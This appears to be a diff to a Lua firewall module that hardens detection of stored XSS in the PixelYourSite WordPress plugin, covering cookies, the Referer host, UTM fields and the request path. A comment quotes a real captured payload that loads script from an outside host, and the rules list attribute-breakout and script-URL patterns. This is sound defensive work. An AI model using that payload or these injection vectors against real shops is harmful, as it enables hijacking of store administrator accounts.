@@ -634,6 +634,8 @@ end
 _M.PHP_FIELDS_WANT = {
   pagename = true, action = true, string_ids = true, ["trp-edit-translation"] = true,
   user_login = true, wc_reset_password = true, ["woocommerce-lost-password-nonce"] = true,
+  -- rule 10025 (PixelYourSite stores $_GET['utm_*'] in the order unescaped)
+  utm_source = true, utm_medium = true, utm_campaign = true, utm_term = true, utm_content = true,
 }
 
 -- want_hints(want): for each wanted name, the literal pieces any key PHP
@@ -4087,62 +4089,102 @@ function _M.detect_cve_litespeed_privesc(cookie)
 end
 
 -- [CVE] PixelYourSite / PixelYourSite PRO unauthenticated stored XSS through
--- the traffic-source cookies. CVE-2026-1844 (PRO <= 12.4.0.2), CVE-2026-1841
+-- the order "enrich" data. CVE-2026-1844 (PRO <= 12.4.0.2), CVE-2026-1841
 -- (free <= 11.2.0), CVE-2026-109987 (cookie printed unescaped; fixed in free
 -- 11.4.3 / PRO 12.6.8). Exploited on this fleet from 2026-02-13 (the day
 -- 1844 was published) to 2026-10-10: ~100 WooCommerce orders on 16 shops.
 --
 -- Source: the plugin code and the fleet's own captures, not memory. On a
 -- WooCommerce Store API checkout (REST_REQUEST), PRO 12.2.7.1's
--- class_enrich_order.php stores $_COOKIE['pysTrafficSource'] and
--- $_COOKIE['pys_landing_page'] raw in the order's pys_enrich_data, and
--- views/html-order-meta-box.php prints them with no escaping. A bot checkout
--- carrying
+-- class_enrich_order.php stores, raw, in the order's pys_enrich_data:
+--   traffic source  $_SESSION['TrafficSource'] ?? $_COOKIE['pysTrafficSource']
+--   landing page    $_SESSION['LandingPage']   ?? $_COOKIE['pys_landing_page']
+--   UTMs            $_GET['utm_*'] ?? $_COOKIE['pys_utm_*'] ?? the session copy
+-- and views/html-order-meta-box.php (+ printUtm) prints them with no
+-- escaping, the landing page also inside href="...". A bot checkout carrying
 --   pysTrafficSource="<script src=https://patchstackk.com/fz/x.js></script><!--P1181854187-->"
 -- runs that script in the admin's browser the moment staff open the order; on
 -- tophair.gr (2026-10-06) it uploaded a fake plugin and created two
 -- administrators within 15 seconds. Fixed versions sanitize on store and
--- esc_html on output; the values they read are the four cookies below.
+-- esc_html on output. The session copies are filled on a session's first
+-- request: TrafficSource from parse_url(HTTP_REFERER)['host'] (or the
+-- cookie), LandingPage from the raw REQUEST_URI path (rule 10026), the UTMs
+-- from that request's $_GET.
 --
--- Fingerprint: one of those cookies whose value, decoded as PHP decodes a
--- cookie (php_url_decode: %XX and `+`), carries markup (`<` or `>`), or a
--- double quote followed by an attribute-breakout token (the landing page is
--- printed inside href="..."). The plugin's own JS stores a URL or a host name
--- (`google.com`, `direct`, `undefined`), URL-encoded, so a decoded value never
--- holds `<`, `>` or a quote; a legal quoted cookie value ("google.com") has
--- the quote but no breakout token. `cookie` is the raw Cookie header; names
--- are matched the way PHP registers them (leading whitespace dropped, decoded,
--- php_var_name), lowercased, which over-reads (PHP's names are case-sensitive)
--- on the safe side. Every pair is checked, not just the first PHP keeps.
--- All methods: the payload rides on every request of the bot's session.
---
--- Second leg, the session: the checkout reads $_SESSION['TrafficSource']
--- before the cookie, and the plugin fills it from getTrafficSource(), which
--- returns parse_url($_SERVER['HTTP_REFERER'])['host'] for an external
--- Referer, unvalidated. A Referer whose host part (after `//`, before the
--- first `/`, `?` or `#`, past any `user@`) holds `<` or `>` plants the same
--- payload (REFERER_HOST_MARKUP). Only the host is checked: parse_url never
--- decodes, a browser never sends a raw `<` there, and markup in a Referer's
--- path or query (a generic XSS probe) is not this CVE's vector.
+-- Rule 10025 (armed) refuses, on any method (the payload rides on every
+-- request of the bot's session):
+--   COOKIE_MARKUP        one of the cookies below holds `<` or `>`;
+--   COOKIE_ATTR_BREAKOUT a quote that closes an attribute (`"` then an
+--                        `on…=` / `style=` attribute, with or without space);
+--   COOKIE_SCRIPT_URL    a landing-page cookie whose URL scheme is not
+--                        http(s) (javascript:, data:, with tabs/newlines
+--                        dropped as a browser drops them);
+--   REFERER_HOST_MARKUP  `<` or `>` in what parse_url takes as the Referer's
+--                        host: the authority after `//`, or the head before
+--                        the first `/` (parse_url reads `x<b>:80` as host:port);
+--   QUERY_UTM_MARKUP     `<` or `>` in a utm_* request field.
+-- The plugin's own JS stores a URL or a host name (`google.com`, `direct`,
+-- `undefined`) there, URL-encoded, so a value never holds `<`/`>`, and a URL,
+-- quoted or not, has no `"` followed by an attribute. Cookie values are
+-- %-decoded (PHP decodes them raw: `+` stays); names are matched after a
+-- %-decode and php_var_name, lowercased, which over-reads (PHP decodes no
+-- cookie name and is case-sensitive). Every pair is checked, not just the
+-- first PHP keeps.
 local PYS_COOKIES = {
   pystrafficsource = true, last_pystrafficsource = true,
   pys_landing_page = true, last_pys_landing_page = true,
 }
+local PYS_LANDING = { pys_landing_page = true, last_pys_landing_page = true }
+for _, t in ipairs({ "source", "medium", "campaign", "term", "content" }) do
+  PYS_COOKIES["pys_utm_" .. t] = true
+  PYS_COOKIES["last_pys_utm_" .. t] = true
+end
+local PYS_UTM_FIELDS = { "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content" }
+
+-- A double quote that closes an attribute value and opens a handler (or a
+-- style) attribute: `" onmouseover=`, `"onfocus=`, `"/style=`. A URL never
+-- has `"` followed by an attribute name and `=`.
+local function attr_breakout(v)
+  local vl = lower(v)
+  return vl:find('"[%s/]*on%a+%s*=') ~= nil or vl:find('"[%s/]*style%s*=') ~= nil
+end
+
+local function landing_script_url(v)
+  local u = lower(v):gsub("[%c%s]", ""):gsub('^["\']+', "")
+  local scheme = u:match("^(%a[%w+.%-]*):")
+  return scheme ~= nil and scheme ~= "http" and scheme ~= "https"
+end
+
 local function pys_referer_host_markup(headers)
   local ref = header_string(headers and (headers["referer"] or headers["Referer"]))
   if ref == "" or not ref:find("[<>]") then return false end
-  local s = ref:find("//", 1, true)
-  if not s then return false end
-  local auth = ref:sub(s + 2):match("^[^/?#]*") or ""
+  -- parse_url never takes the host from the query or fragment.
+  local s = ref:match("^[^?#]*")
+  if s:match("^[^/]*"):find("[<>]") then return true end   -- `host:port` form
+  local d = s:find("//", 1, true)
+  if not d then return false end
+  local auth = s:sub(d + 2):match("^[^/]*")
   auth = auth:match("@([^@]*)$") or auth
   return auth:find("[<>]") ~= nil
 end
 
-function _M.detect_cve_pixelyoursite_xss(cookie, headers)
+function _M.detect_cve_pixelyoursite_xss(cookie, headers, method, args, body, _nab, get_fields)
   if pys_referer_host_markup(headers) then return "REFERER_HOST_MARKUP" end
+  if (args and args ~= "") or (body and body ~= "") then
+    -- "utm", not "utm_": php_var_name turns `utm.content` into utm_content.
+    if field_gate_open(method, args, body, headers, _nab, "utm") then
+      local f = get_fields and get_fields()
+                or _M.php_request_fields(method, args, body, headers, _M.PHP_FIELDS_WANT)
+      for _, name in ipairs(PYS_UTM_FIELDS) do
+        for _, v in ipairs(f[name] or {}) do
+          if v:find("[<>]") then return "QUERY_UTM_MARKUP" end
+        end
+      end
+    end
+  end
   if not cookie or cookie == "" then return nil end
-  -- Cheap gate: every target name holds "pys" once decoded; an encoded name
-  -- (%70ys…) still shows a `%`, so only then is the gate skipped.
+  -- Cheap gate: every target name holds "pys"; an encoded name (%70ys…)
+  -- still shows a `%`, so only then is the gate skipped.
   local lc = lower(cookie)
   if not has(lc, "pys") and not lc:find("%", 1, true) then return nil end
   for pair in cookie:gmatch("[^;]+") do
@@ -4153,17 +4195,30 @@ function _M.detect_cve_pixelyoursite_xss(cookie, headers)
       k = lower(php_var_name(k))
       if PYS_COOKIES[k] then
         local v = pair:sub(eq + 1)
-        if v:find("[%%+]") then v = _form_unescape(v) end
+        if v:find("%", 1, true) then v = url_decode_once(v) end
         if v:find("[<>]") then return "COOKIE_MARKUP" end
-        if v:find('"', 1, true) then
-          local vl = lower(v)
-          if vl:find("on%a+%s*=") or has(vl, "javascript:") or vl:find("style%s*=") then
-            return "COOKIE_ATTR_BREAKOUT"
-          end
-        end
+        if v:find('"', 1, true) and attr_breakout(v) then return "COOKIE_ATTR_BREAKOUT" end
+        if PYS_LANDING[k] and landing_script_url(v) then return "COOKIE_SCRIPT_URL" end
       end
     end
   end
+  return nil
+end
+
+-- Rule 10026 (edge block, ban held): the landing-page session copy is the raw
+-- REQUEST_URI path of a session's first request, which PHP does not decode.
+-- A browser percent-encodes `"`, `<` and `>` in a path (WHATWG path
+-- percent-encode set), so a raw one is a hand-made request: `<`/`>` is
+-- PATH_MARKUP, a quote that opens an attribute is PATH_ATTR_BREAKOUT. Rule 302
+-- (challenge_v2) already sees some of these; this one blocks them, but its
+-- ban is held (HoldAutoblock): generic scanners send the same paths, and
+-- banning and alerting them as CVE-2026-1844 is not what 302's tier chose.
+-- `raw_uri` is $request_uri; nil (the panel gate) skips the rule.
+function _M.detect_cve_pixelyoursite_path_xss(raw_uri)
+  if not raw_uri or raw_uri == "" then return nil end
+  local path = raw_uri:match("^[^?]*")
+  if path:find("[<>]") then return "PATH_MARKUP" end
+  if path:find('"', 1, true) and attr_breakout(path) then return "PATH_ATTR_BREAKOUT" end
   return nil
 end
 
